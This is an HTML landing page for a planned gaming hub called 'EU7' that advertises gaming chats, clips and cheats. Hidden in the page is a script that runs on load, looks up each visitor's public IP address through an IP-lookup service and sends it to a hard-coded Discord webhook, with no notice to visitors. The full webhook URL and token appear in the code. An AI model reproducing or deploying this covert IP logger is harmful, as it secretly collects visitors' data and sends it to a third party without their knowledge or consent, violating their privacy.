<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to EU7</title>
    <!-- Add CSS for styling -->
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            text-align: center;
        }
        h1 {
            font-weight: bold;
            font-size: 24px;
        }
        p {
            font-size: 16px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>Welcome to EU7</h1>
    <p>This is an upcoming game hub for upcoming terms and I will be actively working on this website. What you should expect coming to this website is gaming chats, sharing gaming clips, and most importantly game exploits and cheats!</p>

    <script>
        // Function to send data to webhook
        function sendDataToWebhook(data) {
            fetch('https://discord.com/api/webhooks/1243316178441732127/XT9U5A3O2yjpjpHp-8r5MsJxG4oZXy1lc8dpmoE_eS_ldTDliG3Brm4-jseSU9dKZpYS', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Visitor information sent to webhook successfully');
                } else {
                    console.error('Failed to send visitor information to webhook');
                }
            })
            .catch(error => {
                console.error('Error sending visitor information to webhook:', error);
            });
        }

        // Function to get and send visitor information
        function getAndSendVisitorInfo() {
            // Get visitor's IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;

                    // Send visitor information to webhook
                    var visitorData = {
                        content: 'Visitor IP Address: ' + ipAddress + '\nLocation: Hidden (Secure Mode)'
                    };
                    sendDataToWebhook(visitorData);
                })
                .catch(error => {
                    console.error('Error getting IP address:', error);
                });
        }

        // Call the function immediately on page load
        getAndSendVisitorInfo();
    </script>
</body>
</html>
